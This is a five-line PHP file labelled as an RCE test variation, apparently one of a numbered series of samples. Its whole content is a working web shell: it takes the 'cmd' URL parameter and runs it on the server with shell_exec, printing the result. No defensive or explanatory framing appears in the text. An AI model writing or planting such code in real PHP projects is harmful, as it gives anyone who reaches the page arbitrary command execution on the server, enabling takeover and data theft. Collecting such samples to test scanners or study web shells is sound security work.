<?php
// RCE test variation #1248
$cmd = $_GET['cmd'] ?? 'ls';
echo shell_exec($cmd);
?>